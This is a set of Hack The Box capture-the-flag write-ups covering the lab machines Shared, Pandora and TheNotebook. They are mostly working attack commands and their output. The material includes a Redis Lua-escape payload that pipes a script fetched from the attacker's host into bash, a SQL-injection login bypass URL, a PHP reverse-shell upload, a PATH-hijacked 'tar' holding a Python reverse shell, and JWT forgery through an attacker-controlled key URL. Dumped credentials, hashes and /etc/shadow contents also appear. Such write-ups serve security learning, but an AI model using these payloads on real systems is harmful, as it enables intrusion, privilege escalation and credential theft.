1\nWith manual enumeration we first see that dan_smith is part of sysadmin group, lets look for files owned by that group.\ndan_smith@shared:/$ find / -group sysadmin 2&gt; /dev/null\n/usr/local/bin/redis_connector_dev\nIf we remember from earlier when we ran pspy64 we found another line containing redis:\n2022/08/25 06:58:06 CMD: UID=0    PID=8502   | pidof redis-server \nWe can access the service through redis-cli, however everything we throw at it returns (error) NOAUTH Authentication required.. Lets start hunting for credentials. Most likely we can find SQL creds somewhere in /var/www/.\ndan_smith@shared:/var/www/checkout.shared.htb/config$ cat db.php \n&lt;?php\ndefine('DBHOST','localhost');\ndefine('DBUSER','checkout');\ndefine('DBPWD','a54$K_M4?DdT^HUk');\ndefine('DBNAME','checkout');\n?&gt;\n\ndan_smith@shared:/var/www/shared.htb/ps/app/config$ cat parameters.php \n&lt;?php return array (\n  'parameters' =&gt; \n  array (\n    'database_host' =&gt; '127.0.0.1',\n    'database_port' =&gt; '',\n    'database_name' =&gt; 'pshop',\n    'database_user' =&gt; 'pshop',\n    'database_password' =&gt; 'T*k#cbND_C*WrQ9h',\n    'database_prefix' =&gt; 'ps_',\n    'database_engine' =&gt; 'InnoDB',\n    'mailer_transport' =&gt; 'smtp',\n    'mailer_host' =&gt; '127.0.0.1',\n    'mailer_user' =&gt; NULL,\n    'mailer_password' =&gt; NULL,\n    'secret' =&gt; 'JcFbTGrwO5Jm2jLiGt5Da0PThwPCWPpht34Afzg9pehekQ19TxvUeU5Scmr9aH3J',\n    'ps_caching' =&gt; 'CacheMemcache',\n    'ps_cache_enable' =&gt; false,\n    'ps_creation_date' =&gt; '2022-03-06',\n    'locale' =&gt; 'en-US',\n    'use_debug_toolbar' =&gt; true,\n    'cookie_key' =&gt; 'z7FJgNKKsqvFAkvpIRzx9NfTVNWTMdZhnpuP8Xh6aivNDB1vnPaByT9g6uU3OFQO',\n    'cookie_iv' =&gt; 'aFoWzPnUUEBiTNd4t4uN66XeS37p3eUp',\n    'new_cookie_key' =&gt; 'def00000f935fcfbe80eeeb1a4c68e98f394b3685e9b325f43aa713d659b0fb201d9045aa39fd9499c3498b3c1309aa69fcae9c7d7c257162f8336765eb694420d2d8ff2',\nTesting all found passwords with all found users, including standard username “default”, all fails.. But after a while of testing I noticed something interesting, when running the binary redis_connector_dev they start the service with an interesting line:\ndan_smith@shared:/var/www/shared.htb/ps/app/config$ /usr/local/bin/redis_connector_dev\n[+] Logging to redis instance using password...\n\nINFO command result:\n# Server\nredis_version:6.0.15\nredis_git_sha1:00000000\nredis_git_dirty:0\nredis_build_id:4610f4c3acf7fb25\nredis_mode:standalone\nos:Linux 5.10.0-16-amd64 x86_64\narch_bits:64\nmultiplexing_api:epoll\natomicvar_api:atomic-builtin\ngcc_version:10.2.1\nprocess_id:22242\nrun_id:6eba6ae15533f2538f3bfe3067a305bf07cb1094\ntcp_port:6379\nuptime_in_seconds:38\nuptime_in_days:0\nhz:10\nconfigured_hz:10\nlru_clock:489079\nexecutable:/usr/bin/redis-server\nconfig_file:/etc/redis/redis.conf\nio_threads_active:0\n &lt;nil&gt;\n“Logging to redis instance using password” - are they trying to tell me I should extract the password from this binary?\n\n\nStep 2\nDownload the binary redis_connector_dev to your local attacking machine and run it with ltrace to see if we get the password.\n➜  shared ltrace ./redis_connector_dev\n[... snip ...]\nINFO command result:\n__errno_location()                                                                               = 0x7f1cf4bf46c0\ngetaddrinfo(\"localhost\", nil, 0xc000092960, 0xc0000ac040)                                        = 0\nfreeaddrinfo(0x1a08540)                                                                          = &lt;void&gt;\n dial tcp [::1]:6379: connect: connection refused\n+++ exited (status 0) +++\nIt dies before it has a chance to send the credentials.. setup a nc listener on port 6379 and try again.\n➜  shared ltrace ./redis_connector_dev\n[... snip ...]\nINFO command result:\n__errno_location()                                                                               = 0x7f9d634486c0\ngetaddrinfo(\"localhost\", nil, 0xc000068960, 0xc000010050)                                        = 0\nfreeaddrinfo(0x10523f0)                                                                          = &lt;void&gt;\n i/o timeout\n+++ exited (status 0) +++\n\n➜  shared nc -lvnp 6379\nlistening on [any] 6379 ...\nconnect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 46690\n*2\n$4\nauth\n$16\nF2WHqJUz2WEz=Gqq\nWith the found password we are now able to authenticate and access the redis server:\ndan_smith@shared:/usr/local/bin$ redis-cli -h localhost\nlocalhost:6379&gt; AUTH default F2WHqJUz2WEz=Gqq\nOK\nReading about redis on HackTricks we find an interesting CVE to escape from LUA. Trying to run the script on the victim fails because we’re lacking python3 module ‘redis’.\ndan_smith@shared:/dev/shm$ python3 cve-2022-0543.py \nTraceback (most recent call last):\n  File \"/dev/shm/cve-2022-0543.py\", line 1, in &lt;module&gt;\n    import redis\nModuleNotFoundError: No module named 'redis'\nInstead, setup a SSH tunnel and test the script locally.\n➜  shared ssh -L 6379:127.0.0.1:6379 -N -f dan_smith@shared.htb -i dan-id_rsa\n➜  shared python3 cve-2022-0543.py                                        \nPlease input redis ip:\n&gt;&gt;127.0.0.1\nPlease input redis port:\n&gt;&gt;6379\ninput exec cmd:(q-&gt;exit)\n&gt;&gt;id\nTraceback (most recent call last):\n  File \"/htb/shared/cve-2022-0543.py\", line 30, in &lt;module&gt;\n    shell(ip,port,cmd)\n  File \"/htb/shared/cve-2022-0543.py\", line 19, in shell\n    script = r.eval(lua,0)\n  File \"/usr/lib/python3/dist-packages/redis/client.py\", line 3131, in eval\n    return self.execute_command('EVAL', script, numkeys, *keys_and_args)\n  File \"/usr/lib/python3/dist-packages/redis/client.py\", line 901, in execute_command\n    return self.parse_response(conn, command_name, **options)\n  File \"/usr/lib/python3/dist-packages/redis/client.py\", line 915, in parse_response\n    response = connection.read_response()\n  File \"/usr/lib/python3/dist-packages/redis/connection.py\", line 739, in read_response\n    response = self._parser.read_response()\n  File \"/usr/lib/python3/dist-packages/redis/connection.py\", line 484, in read_response\n    raise response\nredis.exceptions.AuthenticationError: Authentication required.\nIm not sure how to solve the code to include authentication, instead we can exploit it manually as there are two lines of code that actually does everything:\nline 17: lua= 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"'+cmd+'\", \"r\"); local res = f:read(\"*a\"); f:close(); return res'\nline 19: script = r.eval(lua,0)\n➜  shared redis-cli -h 127.0.0.1 --pass F2WHqJUz2WEz=Gqq\n127.0.0.1:6379&gt; eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0\n\"uid=0(root) gid=0(root) groups=0(root)\\n\"\n\n127.0.0.1:6379&gt; eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"wget -qO- http://10.10.14.4/rev.sh | bash\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0\n\n➜  shared nc -lvnp 443\nlistening on [any] 443 ...\nconnect to [10.10.14.4] from (UNKNOWN) [10.10.11.172] 39640\nbash: cannot set terminal process group (23806): Inappropriate ioctl for device\nbash: no job control in this shell\n\nroot@shared:/var/lib/redis# cat /root/root.txt\n4d6594a804436a9950d537695c81fecc\n\nroot@shared:/var/lib/redis# cat /etc/shadow\nroot:$y$j9T$q/qYCzzDEBdZXpRxCa6gL/$XhNZBD56JUTsCniDDjj6UmwRnBc3A40AcbtqNzVEpJ4:19186:0:99999:7:::\ndaemon:*:19071:0:99999:7:::\nbin:*:19071:0:99999:7:::\nsys:*:19071:0:99999:7:::\nsync:*:19071:0:99999:7:::\ngames:*:19071:0:99999:7:::\nman:*:19071:0:99999:7:::\nlp:*:19071:0:99999:7:::\nmail:*:19071:0:99999:7:::\nnews:*:19071:0:99999:7:::\nuucp:*:19071:0:99999:7:::\nproxy:*:19071:0:99999:7:::\nwww-data:*:19071:0:99999:7:::\nbackup:*:19071:0:99999:7:::\nlist:*:19071:0:99999:7:::\nirc:*:19071:0:99999:7:::\ngnats:*:19071:0:99999:7:::\nnobody:*:19071:0:99999:7:::\n_apt:*:19071:0:99999:7:::\nsystemd-timesync:*:19071:0:99999:7:::\nsystemd-network:*:19071:0:99999:7:::\nsystemd-resolve:*:19071:0:99999:7:::\nmessagebus:*:19071:0:99999:7:::\nsshd:*:19071:0:99999:7:::\njames_mason:$y$j9T$zJMiBXFlQaVLqD8B7hPR3.$ceN5vvW/KTMQ.YeNjqT8UVo6TsKm/Dl8P1uefK6v5A1:19071:0:99999:7:::\nsystemd-coredump:!*:19071::::::\nmysql:!:19071:0:99999:7:::\ndan_smith:$y$j9T$vFQT7yf8j9/liKFLt3fr7/$Fqyc1V0r3NrAH2JkdU6N6nEz1v5jm38wUUDbOkqZzsA:19186:0:99999:7:::\nredis:*:19071:0:99999:7:::\n\nroot@shared:/var/lib/redis# cat /root/.ssh/id_rsa\nbash: /root/.ssh/id_rsa: No such file or directory"
  },
  {
    "objectID": "posts/2022-01-31-htb-writeup-pandora/2022-01-31-htb-writeup-pandora.html",
    "href": "posts/2022-01-31-htb-writeup-pandora/2022-01-31-htb-writeup-pandora.html",
    "title": "Pandora - Hack The Box",
    "section": "",
    "text": "USER\n\nStep 1\nnmap:\n[root:/git/htb/pandora]# nmap -p- 10.10.11.136\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\n[root:/git/htb/pandora]# nmap -Pn -n -sCV -p22,80 10.10.11.136\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)\n|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)\n|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-title: Play | Landing\n|_http-server-header: Apache/2.4.41 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n[root:/git/htb/pandora]# nmap -sU --top-port=20 --open 10.10.11.136\nPORT     STATE         SERVICE\n67/udp   open|filtered dhcps\n68/udp   open|filtered dhcpc\n135/udp  open|filtered msrpc\n137/udp  open|filtered netbios-ns\n138/udp  open|filtered netbios-dgm\n161/udp  open          snmp\n520/udp  open|filtered route\n4500/udp open|filtered nat-t-ike\ndirb:\n==&gt; DIRECTORY: http://10.10.11.136/assets/                                                                                                   \n+ http://10.10.11.136/index.html (CODE:200|SIZE:33560)                                                                                       \n+ http://10.10.11.136/server-status (CODE:403|SIZE:277)\nnikto:\n+ Server: Apache/2.4.41 (Ubuntu)\nsnmp-check:\n[root:/git/htb/pandora]# snmp-check 10.10.11.136\n\n[... snip ...]\n\n[+] Try to connect to 10.10.11.136:161 using SNMPv1 and community 'public'\n\n[*] System information:\n\n  Host IP address               : 10.10.11.136\n  Hostname                      : pandora\n  Description                   : Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64\n  Contact                       : Daniel\n\n[... snip ...]\n\n[*] Processes:\n\n  846                   runnable              sh                    /bin/sh               -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'\n  1118                  runnable              host_check            /usr/bin/host_check   -u daniel -p HotelBabylon23\nFound credentials: daniel:HotelBabylon23\n\n\n\nStep 2\nLogin with SSH and the found credentials and begin enumerate the box internally. Keep in mind that we could see on the webserver /assets/scss that there are probably a blog and login page, these could be used as potential escalation vectors.\ndaniel@pandora:/var/www/pandora/pandora_console$ cat * | grep -i admin\n\n[... snip ...]\n\nINSERT INTO `tusuario` (`id_user`, `fullname`, `firstname`, `lastname`, `middlename`, `password`, `comments`, `last_connect`, `registered`, `email`, `phone`, `is_admin`, `language`, `block_size`, `section`, `data_section`, `metaconsole_access`) VALUES\n('admin', 'Pandora', 'Pandora', 'Admin', '', '1da7ee7d45b96d0e1f45ee4ee23da560', 'Admin Pandora', 1232642121, 0, 'admin@example.com', '555-555-5555', 1, 'default', 0, 'Default', '', 'advanced');\n\n[root:/git/htb/pandora]# hashcat -a0 -m0 passwd.hash /usr/share/wordlists/rockyou.txt\n1da7ee7d45b96d0e1f45ee4ee23da560:pandora                  \n                                       \nSession..........: hashcat\nStatus...........: Cracked\nSetup a SSH Tunnel to access the internal webserver, try cracked credentials admin:pandora to login.\n[root:/git/htb/pandora]# ssh -L 80:localhost:80 daniel@pandora.htb\n\nUnfortunatley the login fails.\nOn the bottom of the page we find version v7.0NG.742_FIX_PERL2020, using searchsploit we find three interesting exploits - however all three are authenticated.\n[root:/git/htb/pandora]# searchsploit pandora\nPandora 7.0NG - Remote Code Execution                                                                       | php/webapps/47898.py\nPandora FMS 7.0NG - 'net_tools.php' Remote Code Execution                                                   | php/webapps/48280.py\nPANDORAFMS 7.0 - Authenticated Remote Code Execution                                                        | php/webapps/48064.py\n\n\n\nStep 3\nGoogling Pandora FMS 742 Auth Bypass we find this post. There is a SQL Injection vulnerability in chart_generator.php leading to an authentication bypass - perfect!\n[root:/git/htb/pandora]# sqlmap -u http://localhost/pandora_console/include/chart_generator.php\\?session_id\\=1 --dbms=mysql -D pandora --dump\n[... snip ...]\n[16:01:22] [INFO] retrieved: 'tpassword_history'\n\n[root:/git/htb/pandora]# sqlmap -u http://localhost/pandora_console/include/chart_generator.php\\?session_id\\=1 --dbms=mysql -D pandora -T tpassword_history --dump\nDatabase: pandora\nTable: tpassword_history\n[2 entries]\n+---------+---------+---------------------+----------------------------------+---------------------+\n| id_pass | id_user | date_end            | password                         | date_begin          |\n+---------+---------+---------------------+----------------------------------+---------------------+\n| 1       | matt    | 0000-00-00 00:00:00 | f655f807365b6dc602b31ab3d6d43acc | 2021-06-11 17:28:54 |\n| 2       | daniel  | 0000-00-00 00:00:00 | 76323c174bd49ffbbdedf678f6cc89a6 | 2021-06-17 00:11:54 |\n+---------+---------+---------------------+----------------------------------+---------------------+\nI am not able to crack the password for matt however. Googling around for CVE-2021-32099 poc I come across this one-liner.\nChange it to fit our needs, visit the URL, update the login promt and we’ve bypassed the login as admin.\nhttp://localhost/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO\n\nGo to Admin tools &gt; File manager &gt; Upload file (top right corner), and upload a php reverse shell. Trigger the reverse by visiting http://localhost/pandora_console/images/rev.php.\n[root:/git/htb/pandora]# nc -lvnp 4488                                                                                             (master✱) \nlistening on [any] 4488 ...\nconnect to [10.10.14.11] from (UNKNOWN) [10.10.11.136] 49484\nLinux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\n 14:24:05 up  4:32,  3 users,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\ndaniel   pts/0    10.10.14.6       09:53    1:33m  6:12   0.92s -bash\ndaniel   pts/1    10.10.14.11      12:57   41:33   0.28s  0.28s -bash\ndaniel   pts/2    10.10.14.11      13:19    1:04m  0.03s  0.03s -bash\nuid=1000(matt) gid=1000(matt) groups=1000(matt)\n/bin/sh: 0: cant access tty; job control turned off\n$ hostname && id\npandora\nuid=1000(matt) gid=1000(matt) groups=1000(matt)\n$ cat /home/matt/user.txt\na1d9ef4581130dd7dc6852315d356945\n\n\n\n\nROOT\n\nStep 1\nTrying the usual sudo -l fails, so enumerate the box manually and/or with linpeas.\nmatt@pandora:/dev/shm$ ./linpeas.sh \n\n[... snip ...]\n-rwsr-x--- 1 root matt 17K Dec  3 15:58 /usr/bin/pandora_backup (Unknown SUID binary)\nTrying to execute the binary fails:\nmatt@pandora:/dev/shm$ /usr/bin/pandora_backup \nPandoraFMS Backup Utility\nNow attempting to backup PandoraFMS client\ntar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied\ntar: Error is not recoverable: exiting now\nBackup failed!\nCheck your permissions!\nIt seems like the program want’s to use tar on /root/.backup/pandora-backup.tar.gz. Since this is an easy box, maybe this is exploitable using $PATH.\nFind where tar is located:\nmatt@pandora:/$ which tar\n/usr/bin/tar\n\nOR\n\nmatt@pandora:/$ find / -name \"tar\" -type f 2&gt;&1 | grep -v \"Permission denied\"\n/usr/bin/tar\nCreate a malicious tar-file to be executed:\nmatt@pandora:/dev/shm$ cat tar \npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.11\",4499));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\nmatt@pandora:/dev/shm$ chmod +x tar\nNOTE: It would probably suffice just having /bin/bash in the malicious tar-binary.\nChange the PATH and run pandora_backup to trigger the reverse shell.\nmatt@pandora:/dev/shm$ export PATH=/dev/shm:$PATH\nmatt@pandora:/dev/shm$ sudo /usr/bin/pandora_backup \nsudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted\nsudo: unable to initialize policy plugin\nExecuting the binary without sudo just gives us a shell as matt again. Something is weird with the suid bit.\n\n\n\nStep 2\nTrying to understand why we get Operation not permitted when running commands as sudo, I came across a writeup of OpenAdmin where the writer experienced the same issue. To solve it he generated a new key pair and logged in via ssh.\nTo understand exactly why this was an issue, I spoke with the box creator after completing this box and got this explanation:\n\n“.. its due to apache’s mpm_itk module, it sandboxes the namespace and disables SUID as a form of protection when running apache as another user - https://lists.debian.org/debian-apache/2015/11/msg00022.html”\n\n[root:/git/htb/pandora]# ssh-keygen -t rsa -b 4096 -f matt-id_rsa\n[root:/git/htb/pandora]# cat matt-id_rsa.pub\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC2WZVQuP8WGh3bumMoXGRiVzxWLBWZDR7x1cKfIk59S1ZL8RJcw3jxxOeJ8McF5Bjvet/xtCm9kPbEsIybA2HCK5+H77d+R97x7Yr3bvWd+OzB0Xvw/jsKlDHgiYBQAFKNZAwBKfHu7CCBn/VhsnCmXDizkH3UzvaB638vFlE+aWruHS4Gqge+hWBGkVxVIDeHjb1hNrmUz/QuTivuySqvsTg1B6IONWvS//+jCLsEteyV5aef24agwDVHAM15ILfLGxYRVKh5AjnZuSt090Sy+9ehapJUo2DBTvC8KJjY5pDZ68mFyCxEHRPaicM97ZUsQxAjSGpHoLlvVw9eNbPPYZHOIUs0bc8a50hAK56Gq2MgMOerNe+T0g3/HxMVZdKDwOaVOi2J/PuYTOy9tZkIZKyRiEsZIBFA4w1Mwjp0GIa4hZ1lnPpLsCrG/iFB2xhhfSg46SswAGk38bEFI8a1pnQxqBf+NCVmBil7A4j2ktuMmcLRWBOChBrUb01s348Hf+yNDBuYr7U4QyRz4xBQHg6jV7ZkyBh2vcEBy3YlWYq4YN7Cc2a4cExKX8n0NxBv5C23rhmjg/DEZiGR47jrXGtmGJhMgwJjjqW5vqXqjcYOn778eZ3GpRDML/BmRjGAxPL4aIqju/MD9z66eET79Jam1wzMw4bwWGH81XZAZw==\n\nmatt@pandora:/dev/shm$ mkdir /home/matt/.ssh\nmatt@pandora:/dev/shm$ chmod 700 /home/matt/.ssh/\nmatt@pandora:/dev/shm$ vim /home/matt/.ssh/authorized_keys\nmatt@pandora:/dev/shm$ chmod 600 /home/matt/.ssh/authorized_keys\nmatt@pandora:/dev/shm$ ls -al /home/matt/.ssh/\ntotal 12\ndrwxrwxrwx 2 matt matt 4096 Jan 26 16:29 .\ndrwxr-xr-x 4 matt matt 4096 Jan 26 16:28 ..\n-rw------- 1 matt matt  725 Jan 26 16:29 authorized_keys\n\n[root:/git/htb/pandora]# ssh matt@pandora.htb -i matt-id_rsa\nmatt@pandora:~$\nNow, retrace our steps and change the $PATH and run our malicious tar to get root shell.\nmatt@pandora:/dev/shm$ echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\nmatt@pandora:/dev/shm$ export PATH=/dev/shm:$PATH\nmatt@pandora:/dev/shm$ cat tar \n/bin/bash\nmatt@pandora:/dev/shm$ /usr/bin/pandora_backup \nPandoraFMS Backup Utility\nNow attempting to backup PandoraFMS client\nroot@pandora:/dev/shm# id\nuid=0(root) gid=1000(matt) groups=1000(matt)\n\nroot@pandora:/dev/shm# cat /root/root.txt\nb7604e0c75f6b75c43f2f0a3de0e9b31\n\nroot@pandora:/dev/shm# cat /etc/shadow\nroot:$6$HM2preufywiCDqbY$XPrZFWf6w08MKkjghhCPBkxUo2Ag5xvZYOh4iD4XcN4zOVbWsdvqLYbznbUlLFxtC/.Z0oe9\nmatt:$6$JYpB9KogYA60PG6X$dU7jHpb3MIYYg0evztbE8Xw8dx7ok5/U0PaDT63FgQTwyJFr9DbaLa0WzeZGMFd05hrNCnoP\ndaniel:$6$f4POti4xJyVf3/yD$7/efpNYDq.baYycVczUb4b5LlEBNami3//4TbI6lPNK2MaWPrqbdvAhLdMrfHnnZATY59rLgr4DeEZ3U8S41l/:18964:0:99999:7:::\n\n\n\n\nReferences\nPandora FMS 742 Auth Bypass: - Reference #1 - pandora vuln explained - Reference #2 - sqlpwn.py"
  },
  {
    "objectID": "posts/2021-05-11-htb-writeup-thenotebook/2021-05-11-htb-writeup-thenotebook.html",
    "href": "posts/2021-05-11-htb-writeup-thenotebook/2021-05-11-htb-writeup-thenotebook.html",
    "title": "Thenotebook - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/thenotebook]# nmap -Pn -n -sCV –open 10.10.10.230 (master✱) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA) | 256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA) |_ 256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: The Notebook - Your Note Keeper Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nDIRB: + http://10.10.10.230/admin (CODE:403|SIZE:9) + http://10.10.10.230/login (CODE:200|SIZE:1250) + http://10.10.10.230/logout (CODE:302|SIZE:209) + http://10.10.10.230/register (CODE:200|SIZE:1422)\nNIKTO: + Server: nginx/1.14.0 (Ubuntu)\n\nLooking on the website there’s not much. We can register an account and post notes. Throwing the title and note field to SQLMap shows that none of them are injectable. The register function is also not vulnerable to SQL Injection, nor sql truncation attack.\n\nEnumerate more, maybe we can find something hidden using ffuf.\n[root:/git/htb/thenotebook]# ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.230/admin/FUZZ notes [Status: 200, Size: 1713, Words: 365, Lines: 57] upload [Status: 403, Size: 9, Words: 1, Lines: 1]\nNothing of use.. Trying to access http://10.10.10.230/admin gives us ‘Forbidden’, this got me stuck for a while until I took a closer look on the cookie. If we base64 decode it we get some output;\n[root:/git/htb/thenotebook]# echo “eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6InRlc3QxIiwiZW1haWwiOiJ0ZXN0QHRlc3QudGVzdCIsImFkbWluX2NhcCI6ZmFsc2V9.gmYjR9KgoB2_fTNK82N2BUD-BJdmlDk9R5oqStTE9qKRE-VdB43Qwx9V8SiIyMiFrjchy1_SnItICySlyNpJPi8ut4_u2g3V_YwVytg39f6gQWYVlQU3k0TRH2YTMp1eQI_Mq4BZGvd0MrI2TnJ8v75RsX_vEhff6EqhWyXrePyGU_4IhC4PEnDw1sfmWkfsTbs0-cKY8r2T1HoKkLidSBWIylVDQby387mk1bj3WdbcTZtInzyOIhZBRC_k5rDFZCTkkqIiHx5JUk_TVIDUQdw34d4GrwFHCsdpo9m0pQgXLWkdPmS7j6qJjDpr3e9OK3eojnC5cLTMKYDdnJv538nQ5v8oHlv5v743pKtUtJ8L-Pp8MbnExkIkQGhorF7LK5nFebKaAk8V1wBU71__NPMJEdtrkD5pZuY1rncamDBn1hP39opX6VBhRnHsM08ig1xR3PiBSas2SDWHDuselhuDGFJlUTxBHZ2cHFKG-msrOh4dy435N57GXSyy7iq7sqvlGjtZ_Y4A2lfFfORAYNMf-xbT3H1XZ5_i-m9nEkr0zO-eGnDgglJ-f09y9RtOc6WDULhcdNG7NE9G078nNYyhic_CG6TH7nXmG1KN2MSAIu5qBbVr4nRk8ow_Z95yYMnGNWksvx7_kd6RCXhWzdFoZa0u_Bxna-dUXWZhkD4” | base64 -d {“typ”:“JWT”,“alg”:“RS256”,“kid”:“http://localhost:7070/privKey.key”}base64: invalid input\nIt’s a JSON Web Token! The token is built from three parts, each separated by a period (.) which is why we get ‘base64: invalid input’. Lets decode the first and second part of the token to get it’s content.\nFIRST PART: [root:/git/htb/thenotebook]# echo “eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9” | base64 -d {“typ”:“JWT”,“alg”:“RS256”,“kid”:“http://localhost:7070/privKey.key”}\nSECOND PART: [root:/git/htb/thenotebook]# echo “eyJ1c2VybmFtZSI6InRlc3QxIiwiZW1haWwiOiJ0ZXN0QHRlc3QudGVzdCIsImFkbWluX2NhcCI6ZmFsc2V9” | base64 -d (master✱) {“username”:“test1”,“email”:“test@test.test”,“admin_cap”:false}\nThe third, and last part is the signature. Here we can create our own signature to verify the token. Manipulate values of the first part to look on a custom key on our local host, and on the second part set admin_cap to true.\nFIRST PART (Manipulated): [root:/git/htb/thenotebook]# echo ‘{“typ”:“JWT”,“alg”:“RS256”,“kid”:“http://10.10.14.12:7070/privKey.key”}’|base64 eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xMjo3MDcwL3ByaXZLZXkua2V5In0K\nSECOND PART (Manipulated): [root:/git/htb/thenotebook]# echo ‘{“username”:“test1”,“email”:“test@test.test”,“admin_cap”:true}’|base64 (master✱) eyJ1c2VybmFtZSI6InRlc3QxIiwiZW1haWwiOiJ0ZXN0QHRlc3QudGVzdCIsImFkbWluX2NhcCI6dHJ1ZX0K\nTHIRD PART (Signature): Create a SSH key to verify signature: [root:/git/htb/thenotebook]# ssh-keygen -t rsa -b 4096 -m PEM -f privKey.key (master✱) Generating public/private rsa key pair. Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in privKey.key Your public key has been saved in privKey.key.pub The key fingerprint is: SHA256:PTmSuqRWcPmVBLPoUWnFaXZ/5p4m1jpTL6VeMF+K2oQ root@nidus The key’s randomart image is: +—[RSA 4096]—-+ | +=.. | | ooo* . | | oo.+ o . | | ..o. oo. . o| | o..S.= o+.| | …. + . *+| | .o E o ++=| | .o . + =o=o| | .. . . ooB. | +—-[SHA256]—–+\nWrite RSA key: [root:/git/htb/thenotebook]# openssl rsa -in privKey.key -pubout -outform PEM -out privKey.key.pub (master✱) writing RSA key\nGo to https://jwt.io to create a new token. Paste our base64 values with a period in between, and for the signature - cat privKey.key and paste the value in the ‘Private Key’ text box on the right. If everything goes correctly, we should now get a new token in the ‘Encoded’ box to the left.\nEncoded JWT Token: 